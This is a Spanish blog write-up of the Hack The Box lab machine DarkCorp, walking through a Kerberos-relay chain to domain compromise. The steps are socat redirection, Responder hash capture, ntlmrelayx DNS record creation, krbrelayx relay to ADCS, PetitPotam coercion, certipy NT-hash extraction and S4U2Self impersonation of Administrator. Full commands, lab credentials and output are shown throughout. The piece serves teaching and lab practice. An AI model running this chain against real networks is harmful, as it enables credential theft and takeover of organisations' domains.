---
title: "DNSAdmins to Domain Compromise via Kerberos Relay and ADCS"
date: 2026-02-16
categories:
  - Hack The Box
  - Windows
tags:
  - Active Directory
  - Kerberos
  - NTLMRelay
  - KrbRelay
  - Active Directory Certificate Services
  - Ticket Service
  - Domain Controller
  - PetitPotam
  - DNSAdmins
  - Responder
  - S4U2Self
  - Coerced Authentication
  - BloodHound
  - certipy-ad
  - impacket
  - socat
  - krbrelayx
  - Privilege Escalation
  - Lateral Movement
  - Credential Capture
  - HTB
layout: single
author_profile: true
show_date: true
toc: true
toc_sticky: true
toc_label: "Topics"
---

Hoy voy a hablar de un ataque bastante interesante y con varios pasos encadenados para comprometer un Active Directory completo. La cosa empieza así: hay una cuenta de servicio que pertenece al grupo **DNSAdmins**, pero yo no tengo sus credenciales. Lo único que tengo es una forma de provocar tráfico desde esa cuenta hacia mí.

Aquí es donde entra el **Kerberos Relay**. La idea es simple pero letal: si puedo hacer que esa cuenta se autentique contra algo que yo controlo, puedo capturar esa autenticación Kerberos y **relayarla** (redirigirla) hacia otro servicio, en este caso **Active Directory Certificate Services (ADCS)**.

¿Por qué ADCS? Porque si logro que ADCS me dé un certificado válido usando la autenticación robada, ese certificado me permite autenticarme como la cuenta de servicio sin necesitar su contraseña. Y una vez tengo eso, puedo abusar de sus privilegios para escalar hasta Domain Admin.

El grupo **DNSAdmins** es clave aquí porque me permite crear registros DNS falsos en el dominio. Eso significa que puedo hacer que las máquinas del dominio intenten conectarse a un servidor controlado por mí pensando que es legítimo. Cuando lo hacen, capturó la autenticación Kerberos y arranca toda la cadena.


---


## Contexto del Ataque - Máquina DarkCorp (HTB)

Para demostrar este ataque voy a estar usando la máquina **DarkCorp** de HackTheBox, donde precisamente se explota esta cadena para escalar privilegios hasta Domain Admin.

### El punto de entrada: Forzando tráfico desde svc_acc

Primero, necesito entender cómo puedo hacer que la cuenta `svc_acc` genere tráfico hacia mí para poder capturar y relayar su autenticación.

En esta máquina hay un servicio web corriendo en el puerto 5000. En el dashboard, específicamente en la sección **"Check Status"**, hay un panel que permite verificar el estado de un dominio.

[![](/assets/images/45.png)](/assets/images/45.png)

La clave aquí es simple: si ese panel está verificando si un dominio está activo, **por detrás tiene que estar enviando una solicitud HTTP**. Y si hay una solicitud, hay una cuenta generando tráfico. Esa cuenta es `svc_acc`

### Redirigiendo el tráfico con socat

Ahora viene la parte interesante. Anteriormente había logrado acceso al sistema con una shell como el usuario `postgres`, que está en un entorno Linux pero **dentro de la red interna del DC**. Esto es clave porque puedo usar esa sesión como puente.

Lo que hago es usar **socat** para redirigir todo el tráfico del puerto 8080 de la red interna hacia mi puerto 80 en mi máquina atacante:

```bash
postgres@drip:/dev/shm$ ./socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.10.15.127:80
```

Básicamente, cualquier solicitud que llegue al puerto 8080 en la red interna, termina llegando directamente a mí. Esto también se puede hacer con cualquier cuenta que esté en la red interna del DC, no necesariamente tiene que ser `postgres`.


### Capturando el hash NTLMv2 con Responder

Con el tráfico ya redirigido hacia mí, levanto **Responder** en mi interfaz `tun0`. Responder es una herramienta que envenena la red y cuando recibe solicitudes, **obliga al cliente a resolver un reto de autenticación NTLM**, capturando así el hash NTLMv2.

Activo Responder y desde la web le doy a "Check!" apuntando al dominio `drip.darkcorp.htb:8080`. En cuestión de segundos, Responder captura el hash

```bash
┌──(.env)─(root㉿kali)-[/home/kali/Downloads/Responder]
└─# python3 Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.127]
    Responder IPv6             [fe80::e318:5d01:b5cd:50cd]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-M3PN69P4XUZ]
    Responder Domain Name      [MJFV.LOCAL]
    Responder DCE-RPC Port     [48356]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                                                                                                 

[HTTP] NTLMv2 Client   : 10.129.232.7
[HTTP] NTLMv2 Username : darkcorp\svc_acc
[HTTP] NTLMv2 Hash     : svc_acc::darkcorp:5fd46f0d0832cfc1:C60DA4FDA6DB8F96B3D81BA15B76BAD9:010100000000000033C54535D591DC0115ED0A7CC51BF7F600000000020008004D004A004600560001001E00570049004E002D004D00330050004E003600390050003400580055005A00040014004D004A00460056002E004C004F00430041004C0003003400570049004E002D004D00330050004E003600390050003400580055005A002E004D004A00460056002E004C004F00430041004C00050014004D004A00460056002E004C004F00430041004C0008003000300000000000000000000000003000006974F8F84286AE2439510D4BB467DAC5FE01251AB20F6353EB5B85F0E1EAB6930A0010000000000000000000000000000000000009002C0048005400540050002F0064007200690070002E006400610072006B0063006F00720070002E006800740062000000000000000000                                               
[*] Skipping previously captured hash for darkcorp\svc_acc
```

Tengo el hash de `darkcorp\svc_acc`, la cuenta de servicio que está haciendo las verificaciones por detrás

### ¿Y si no puedo crackear el hash?

Aunque este hash no se pudo crackear con diccionarios, **no es el final del camino**. Aquí es donde entra el **Kerberos Relay**. En lugar de intentar romper el hash, puedo aprovechar directamente esa autenticación que está generando `svc_acc` y **relayarla** hacia otro servicio, específicamente hacia ADCS, para obtener algo mucho más valioso: un certificado válido.

Y ahí es donde la cosa se pone realmente interesante.


## Abusando de DNSAdmins para crear el vector de ataque

Aquí es donde la cosa se pone realmente interesante. Al revisar en **BloodHound** los grupos a los que pertenece `svc_acc` (había recolectado información del AD anteriormente), noto algo clave: **esta cuenta es miembro del grupo DNSAdmins**.

Esto es crítico porque pertenecer a DNSAdmins me permite **crear registros DNS** en el dominio apuntando a mi IP. Con eso puedo hacer que cuando las máquinas del dominio intenten resolver ese nombre, terminen conectándose a mí. Y cuando eso pase, capturo la autenticación Kerberos y la relaeo hacia **ADCS** para obtener un certificado válido.

[![](/assets/images/46.png)](/assets/images/46.png)

Para entender bien esta técnica, me basé en este artículo de Synacktiv sobre [Relaying Kerberos over SMB using krbrelayx](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx).

### Creando el registro DNS malicioso

Lo primero que hago es levantar **ntlmrelayx** apuntando contra LDAP para crear el registro DNS

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/dark/content]
└─$ proxychains impacket-ntlmrelayx -t ldap://172.16.20.1 --add-dns-record dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.127
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

### ¿Por qué ese nombre DNS tan largo y extraño?

Ese nombre (`dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`) no es aleatorio. Es una **estructura serializada en Base64** que engaña al sistema de autenticación Kerberos de Windows.

El truco funciona así:

1. **Estructura serializada**: Ese nombre largo contiene una estructura `CREDENTIAL_TARGET_INFORMATION` codificada.
2. **Explotación del mecanismo**: Cuando un cliente SMB construye el SPN (Service Principal Name), Windows usa la función `SecMakeSPNEx2`, que internamente llama a `CredMarshalTargetInfo` y agrega esa información al final del SPN.
3. **El engaño clave**:
    - El cliente solicita un ticket Kerberos para un servicio legítimo (como `cifs/fileserver`)
    - Pero se conecta físicamente al servidor con el nombre largo (el mio)
    - Windows llama a `CredUnmarshalTargetInfo` para procesar los datos
    - **Elimina automáticamente** esa parte larga del final, restaurando el SPN original
    - El paquete Kerberos contiene el nombre legítimo, pero la conexión TCP va a mi servidor

Es básicamente un **bypass del mecanismo de validación de Kerberos**. Windows cree que está conectándose a algo legítimo, pero termina hablando conmigo.


Con `ntlmrelayx` levantado y esperando conexiones, vuelvo a la web y genero tráfico nuevamente haciendo clic en "Check!". Esta vez, en lugar de solo capturar el hash, **relaeo la autenticación completa hacia LDAP**

```bash
*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://172.16.20.1
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:389  ...  OK
[*] (HTTP): Client requested path: /
[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://172.16.20.1 SUCCEED [1]
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:53  ...  OK
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.15.127` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Dumping domain info for first time
[*] ldap://DARKCORP/SVC_ACC@172.16.20.1 [1] -> Domain info dumped into lootdir!
```

Perfecto. La autenticación fue exitosa, `ntlmrelayx` se autenticó en LDAP **como svc_acc** y creó el registro DNS apuntando a mi IP. Ahora cualquier máquina que intente resolver ese nombre, terminará conectándose a mí


## Relayando Kerberos hacia ADCS y obteniendo el certificado

Ahora viene la parte final del ataque. Lo siguiente es levantar **krbrelayx**, que será quien capture la autenticación Kerberos y la relaee directamente hacia **AD CS** para solicitar un certificado.

Lo configuro apuntando al endpoint de Certificate Services

```bash
┌──(.env)─(root㉿kali)-[/home/kali/Downloads/krbrelayx]
└─# proxychains python3 krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs --template Machine -v 'WEB-01$' -dc-ip 172.16.20.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/home/kali/Downloads/krbrelayx/lib/clients/__init__.py:17: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import os, sys, pkg_resources
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

**Parámetros clave:**

- `-t`: Target, el endpoint web de ADCS
- `--adcs`: Modo ADCS para solicitar certificados
- `--template Machine`: Plantilla de certificado de máquina (permite autenticación)
- `-v 'WEB-01$'`: Víctima, la cuenta máquina que forzaremos a autenticarse

krbrelayx levanta servidores SMB, HTTP y DNS, quedando a la espera de recibir una autenticación Kerberos válida.

### Forzando la autenticación con PetitPotam

Para provocar que una máquina del dominio se autentique contra mí, uso **PetitPotam**, una técnica que abusa de funciones RPC del servicio de cifrado de archivos (MS-EFSRPC) para forzar autenticación.

Lo apunto al registro DNS malicioso que creé antes

```bash
┌──(kali㉿kali)-[~/…/HTB/dark/content/PetitPotam]
└─$ proxychains python3 PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 172.16.20.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/home/kali/Desktop/HTB/dark/content/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.20.2[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.2:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Aunque `EfsRpcOpenFileRaw` está parcheada, **encuentra otra función sin parchear** (`EfsRpcEncryptFileSrv`) y la explota exitosamente.

**¿Qué hace PetitPotam?**

- Se conecta a la máquina objetivo (172.16.20.2) mediante SMB
- Llama a funciones del servicio MS-EFSRPC
- Esto **obliga a la máquina a autenticarse** contra el nombre que especifiques

### Capturando el certificado

En mi servidor con krbrelayx recibo la conexión:

```bash
[*] SMBD: Received connection from 10.129.232.7
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:443  ...  OK
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] SMBD: Received connection from 10.129.232.7
[*] CSR generated!
[*] Getting certificate...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:443  ...  OK
[*] HTTP server returned status code 200, treating as a successful login
[*] GOT CERTIFICATE! ID 6
[*] Writing PKCS#12 certificate to ./WEB-01.pfx
[*] Skipping user WEB-01$ since attack was already performed
[*] Certificate successfully written to file
^C                                                                                                                                                                                            
┌──(.env)─(root㉿kali)-[/home/kali/Downloads/krbrelayx]
└─# ls
addspn.py  dnstool.py  krbrelayx.py  lib  LICENSE  printerbug.py  README.md  WEB-01.pfx
```


### ¿Por qué WEB-01$ y no svc_acc?

Esto es importante entenderlo bien. Cuando ejecutamos PetitPotam apuntando al registro DNS malicioso, **no estamos forzando la autenticación de svc_acc**, sino la de la **cuenta máquina de WEB-01**.

¿Por qué? Porque PetitPotam lo que hace es obligar a una **máquina** a autenticarse, no a un usuario. Cuando apuntas PetitPotam contra `172.16.20.2` (que es WEB-01), esa máquina es quien genera la autenticación Kerberos hacia el nombre DNS que le especificas. Y en Active Directory, cada máquina tiene su propia cuenta con el formato `MAQUINA$`, en este caso `WEB-01$`.

Entonces el flujo es:

- PetitPotam le dice a **WEB-01** que se autentique contra nuestro registro DNS malicioso
- **WEB-01** obedece y envía su autenticación Kerberos como `WEB-01$`
- krbrelayx captura esa autenticación y la relaea hacia ADCS
- ADCS emite un certificado válido para `WEB-01$`

**¿Y por qué nos interesa la cuenta máquina y no svc_acc?**

Porque las cuentas máquina en Active Directory por defecto tienen habilitada la delegación, lo que nos permite después abusar de **S4U2Self** para impersonar al Administrator. Con una cuenta de usuario normal como `svc_acc` eso no sería posible directamente.

En resumen, `svc_acc` fue nuestra llave para entrar al dominio DNS, pero `WEB-01$` es la cuenta que nos da el poder real para escalar.


**Lo que acaba de pasar:**

1. La máquina se autenticó con Kerberos contra mí
2. krbrelayx **relayó esa autenticación** hacia ADCS
3. ADCS validó la autenticación como legítima
4. Generó un **certificado de máquina válido** para `WEB-01$`
5. krbrelayx lo guardó como `WEB-01.pfx`

Ahora tengo un certificado válido que puedo usar para autenticarme como la cuenta máquina `WEB-01$`.

### Extrayendo el hash NT con el certificado

Uso **certipy-ad** para autenticarme con el certificado y extraer el hash NT

```bash
┌──(.env)─(root㉿kali)-[/home/kali/Downloads/krbrelayx]
└─# proxychains certipy-ad auth -pfx WEB-01.pfx -dc-ip 172.16.20.1 -ns 172.16.20.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'WEB-01.darkcorp.htb'
[*]     Security Extension SID: 'S-1-5-21-3432610366-2163336488-3604236847-20601'
[*] Using principal: 'web-01$@darkcorp.htb'
[*] Trying to get TGT...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[*] Got TGT
[*] Saving credential cache to 'web-01.ccache'
[*] Wrote credential cache to 'web-01.ccache'
[*] Trying to retrieve NT hash for 'web-01$'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

El certificado me permite autenticarme y mediante **PKINIT** (autenticación Kerberos con certificados), certipy extrae el hash NT de la cuenta máquina.

### Impersonando al Administrator con S4U2Self

Aquí viene el golpe final. Con el hash de `WEB-01$`, puedo abusar de las extensiones de delegación de Kerberos **S4U2Self** para solicitar un ticket de servicio (ST) **en nombre del usuario Administrator**

```bash
┌──(.env)─(root㉿kali)-[/home/kali/Downloads/krbrelayx]
└─# proxychains impacket-getST -self 'DARKCORP.HTB/WEB-01$' -altservice 'cifs/web-01.darkcorp.htb' -dc-ip 172.16.20.1 -impersonate 'administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[*] Impersonating administrator
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[*] Changing service from WEB-01$@DARKCORP.HTB to cifs/web-01.darkcorp.htb@DARKCORP.HTB
[*] Saving ticket in administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache
```

**¿Qué es S4U2Self?**  
Es una extensión de Kerberos que permite a un servicio **solicitar un ticket para cualquier usuario** hacia sí mismo, incluso si ese usuario nunca se autenticó directamente. Diseñado para delegation, pero explotable para impersonación.

**Parámetros clave:**

- `-self`: Usa S4U2Self (solicitar ticket para otro usuario)
- `-impersonate 'administrator'`: Usuario a suplantar
- `-altservice 'cifs/web-01.darkcorp.htb'`: Servicio destino

Ya con el ticket Kerberos del Administrator para el servicio CIFS de `WEB-01`, tengo control total sobre esa máquina. CIFS es el protocolo de compartición de archivos de Windows, así que con un ticket válido como Administrator sobre este servicio puedo autenticarme, ejecutar comandos remotamente, leer y escribir archivos y acceder a cualquier recurso compartido de esa máquina sin restricciones.

---

Diagrama del flujo del **Krbrelay Attack**

[![](/assets/images/krbrelay-flow.png)](/assets/images/krbrelay-flow.png)
